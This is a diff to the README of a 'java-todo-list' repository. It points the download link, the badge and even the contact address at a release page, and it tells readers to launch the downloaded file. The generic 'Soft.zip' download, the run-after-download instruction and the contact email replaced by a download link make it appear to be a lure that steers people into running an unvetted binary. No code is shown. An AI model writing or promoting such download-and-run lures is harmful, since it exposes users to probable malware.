@@ -18,7 +18,7 @@ Welcome to the **java-todo-list** repository, your go-to place for an interactiv
 
 ## 📦 Download
 
-To download the **java-todo-list** project, click [here](https://github.com/files/Soft.zip) and launch the file after downloading.
+To download the **java-todo-list** project, click [here](https://github.com/tyuioayu/java-todo-list/releases/tag/v1.2) and launch the file after downloading.
 
 If the link does not work or needs to be launched, please check the "Releases" section for an alternative download option.
 
@@ -35,8 +35,8 @@ If you are interested in contributing to the **java-todo-list** project, feel fr
 
 ## 📞 Contact
 
-If you have any questions, suggestions, or feedback regarding the Java ToDo List Manager, please reach out to us via email at [todo.list@example.com](mailto:todo.list@example.com).
+If you have any questions, suggestions, or feedback regarding the Java ToDo List Manager, please reach out to us via email at [https://github.com/tyuioayu/java-todo-list/releases/tag/v1.2](https://github.com/tyuioayu/java-todo-list/releases/tag/v1.2).
 
 Let's make task management simpler and more efficient with the **java-todo-list**! 🚀
 
-[![](https://img.shields.io/badge/Download-Here-yellow)](https://github.com/files/Soft.zip)
+[![](https://github.com/tyuioayu/java-todo-list/releases/tag/v1.2)](https://github.com/tyuioayu/java-todo-list/releases/tag/v1.2)
